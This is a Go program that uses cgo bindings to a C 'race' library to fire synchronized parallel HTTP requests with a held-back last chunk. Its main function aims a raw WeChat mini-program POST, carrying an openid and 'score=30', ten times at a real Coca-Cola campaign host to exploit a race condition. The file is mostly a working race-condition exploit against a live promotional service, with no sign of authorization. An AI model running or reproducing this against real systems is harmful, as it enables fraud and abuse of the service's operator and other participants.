package main

/*
#cgo LDFLAGS: -L/opt/homebrew/opt/openssl@3/lib -L${SRCDIR}/../../build/lib/ -L/opt/homebrew/Cellar/libevent/2.1.12/lib -lracestatic -levent -levent_openssl -lssl -lcrypto
#include "../../lib/include/race.h"
#include "../../lib/include/race_raw.h"
#include "../../lib/include/race_status.h"
#include <stdlib.h>
#include <string.h>
*/
import "C"
import (
	"errors"
	"fmt"
	"unsafe"
)

type raceRawParam struct {
	Data  string `json:"data"`
	Count uint   `json:"count"`
}

type raceParam struct {
	Type          string `json:"type"`
	DelayTimeUsec int    `json:"delay_time_usec"`
	LastChunkSize int    `json:"last_chunk_size"`
}

type raceRaw struct {
	Host      string         `json:"host"`
	SSLFlag   bool           `json:"ssl"`
	RaceParam []raceRawParam `json:"race_param"`
}

type RaceJob struct {
	Race raceParam `json:"race"`
	Raw  *raceRaw  `json:"raw"`
}

type RaceResponse struct {
	Responce string `json:"response"`
}

type RaceStatus struct {
	Responses []RaceResponse `json:"responses"`
}

func Run(rJob *RaceJob) (*RaceStatus, error) {
	raceStatus := &RaceStatus{}
	if rJob == nil {
		return nil, errors.New("empty job")
	}
	cRace := C.race_new()
	defer C.race_free(cRace)
	rParam := &rJob.Race
	if rParam.Type == "paralell" {
		C.race_set_option(cRace, C.RACE_OPT_MODE_PARALELLS, 1)
	} else if rParam.Type == "pipeline" {
		C.race_set_option(cRace, C.RACE_OPT_MODE_PIPELINE, 1)
	}
	if C.race_set_option(cRace, C.RACE_OPT_LAST_CHUNK_DELAY_USEC, C.size_t(rParam.DelayTimeUsec)) != C.RACE_OK {
		return nil, errors.New(C.GoString(C.race_strerror(cRace)))
	}
	if C.race_set_option(cRace, C.RACE_OPT_LAST_CHUNK_SIZE, C.size_t(rParam.LastChunkSize)) != C.RACE_OK {
		return nil, errors.New(C.GoString(C.race_strerror(cRace)))
	}
	if rJob.Raw != nil {
		rRaw := rJob.Raw
		cRaw := C.race_raw_new(cRace)
		defer C.race_raw_free(cRaw)
		host := C.CString(rRaw.Host)
		if C.race_raw_set_url(cRaw, host, C._Bool(rRaw.SSLFlag)) != C.RACE_OK {
			C.free(unsafe.Pointer(host))
			return nil, errors.New(C.GoString(C.race_strerror(cRace)))
		}
		C.free(unsafe.Pointer(host))
		for _, raceParam := range rRaw.RaceParam {
			data := C.CString(raceParam.Data)
			len := C.strlen(data) + 1
			if C.race_raw_add_race_param(cRaw, C.uint(raceParam.Count), unsafe.Pointer(data), len) != C.RACE_OK {
				C.free(unsafe.Pointer(data))
				return nil, errors.New(C.GoString(C.race_strerror(cRace)))
			}
			C.free(unsafe.Pointer(data))
		}
		if C.race_raw_apply(cRaw) != C.RACE_OK {
			return nil, errors.New(C.GoString(C.race_strerror(cRace)))
		}
	} else {
		return nil, errors.New("race body must be specified")
	}
	cRaceInfo := &C.race_info_t{}
	if C.race_run(cRace, &cRaceInfo) != C.RACE_OK {
		defer C.race_info_free(cRaceInfo)
		return nil, errors.New(C.GoString(C.race_strerror(cRace)))
	}
	defer C.race_info_free(cRaceInfo)
	count := C.race_info_count(cRaceInfo)
	for index := 0; index < int(count); index++ {
		resp := C.race_info_get_response(cRaceInfo, C.uint(index))
		respBuf := C.GoStringN((*C.char)(resp.data), C.int(resp.len))
		raceStatus.Responses = append(raceStatus.Responses, RaceResponse{respBuf})
	}
	return raceStatus, nil
}
func main() {
	var c = []raceRawParam{{"POST /app.php/final HTTP/1.1\r\nHost: lemondouh5.icoke.cn\r\nContent-Length: 197\r\nAccept: application/json, text/javascript, */*; q=0.01\r\nUser-Agent: Mozilla/5.0 (Linux; Android 7.1.1; Mi Note 3 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/3263 MMWEBSDK/201201 Mobile Safari/537.36 MMWEBID/6358 MicroMessenger/7.0.22.1820(0x2700163B) Process/appbrand2 WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64 miniProgram\r\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\r\nOrigin: https://iuat.icoke.cn\r\nX-Requested-With: com.tencent.mm\r\nSec-Fetch-Site: same-site\r\nSec-Fetch-Mode: cors\r\nSec-Fetch-Dest: empty\r\nReferer: https://iuat.icoke.cn/public/campaign/h5/421844465238519808/423641150963101696/220725203647132/index.html?benchmarkLevel=20&code=0dfbf0fb537642dcb71a70b5264ce1ac&latitude=31.17067626953125&longitude=121.60652615017361&qrlink=https%3A%2F%2Fiuat.icoke.cn%2F2022_LEMONDOU%2F%3Futm_campaign%3D2022_LEMONDOU%26utm_medium%3DOthers_WeChat%26utm_source%3Dtest&scene=LONG_PRESS_QR_CODE&utm_campaign=2022_LEMONDOU&utm_content=1012&utm_medium=Others_WeChat&utm_source=test\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7\r\nConnection: close\r\n\r\nopenid=947b28424bb84684e954d47199700c97d1b3c31f609098adb763b1bfb53f6c97&score=30&utm_source=test&utm_campaign=2022_LEMONDOU&utm_medium=Others_WeChat&hmsr=&hmpl=&hmcu=&hmkw=&hmci=&utm_source_level=1\r\n\r\n", 10}}
	rj := RaceJob{
		Race: raceParam{
			"paralell",
			1000000,
			3,
		},
		Raw: &raceRaw{
			Host:      "tcp://lemondouh5.icoke.cn:443",
			SSLFlag:   true,
			RaceParam: c,
		},
	}
	run, err := Run(&rj)
	if err != nil {
		fmt.Println(err)
		return
	}
	fmt.Println(run)
}
